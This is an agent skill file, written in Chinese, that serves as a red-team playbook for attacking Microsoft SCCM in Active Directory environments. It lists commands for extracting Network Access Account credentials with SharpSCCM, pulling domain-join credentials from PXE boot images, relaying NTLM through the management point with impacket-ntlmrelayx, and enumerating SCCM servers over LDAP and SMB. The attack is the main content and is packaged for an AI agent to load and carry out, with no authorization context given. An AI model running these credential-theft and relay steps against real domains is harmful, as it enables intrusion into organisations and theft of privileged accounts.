---
name: 'sccm-attacks'
description: 'SCCM攻击：NAA提取+MP中继+PXE引导凭据。企业级AD环境关键攻击面。'
disable-model-invocation: true
metadata: { domain: ad-win, tier: T2 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

## SCCM / Configuration Manager 攻击

### 识别
- SCCM 服务器通常在 `SMS_MP`、`SMS_DP`、`SMS_SUP` 等 AD 容器
- 客户端监听端口 10123
- 管理点 MP 默认 HTTPS 443

### 主要攻击路径

#### A: NAA (Network Access Account) 提取
```bash
# NAA 密码存储在 SCCM 客户端的 WMI 中（加密但可解密）
# 利用工具: SharpSCCM
SharpSCCM.exe get naa
# NAA 通常有域管理员级别的访问 OSD 部署共享
```

#### B: PXE Boot Media 提取
```bash
# SCCM 的 PXE 启动镜像中嵌入域加入凭据
# 工具: SharpPXE 
SharpPXE.exe
# → 从 PXE 引导镜像提取 domain join 凭据
```

#### C: MP 中继（NTLM Relay）
```bash
# SCCM Management Point 接受 HTTP NTLM 认证
# 如果 MP 配置为 HTTP（非 HTTPS）→ 中继到其他服务
impacket-ntlmrelayx -t smb://<target> -smb2support --no-smb-server
```

#### D: Client Push 账户
- SCCM 客户端推送安装账户是本地管理员
- 可以通过 SCCM 管理控制台获取

### 枚举
```bash
# LDAP 查询 SCCM 服务器
ldapsearch -H ldap://DC -b "CN=System Management,CN=System,DC=domain,DC=local"
# 客户端探测（有凭据时）
nxc smb <subnet> -u <user> -p <pass> -M sccm
```

### 关键工具
- **SharpSCCM**: NAA 提取、站点枚举、DP 内容枚举
- **SharpPXE**: PXE 启动镜像凭据提取
- **pxethief**: 同样是 PXE 凭据提取
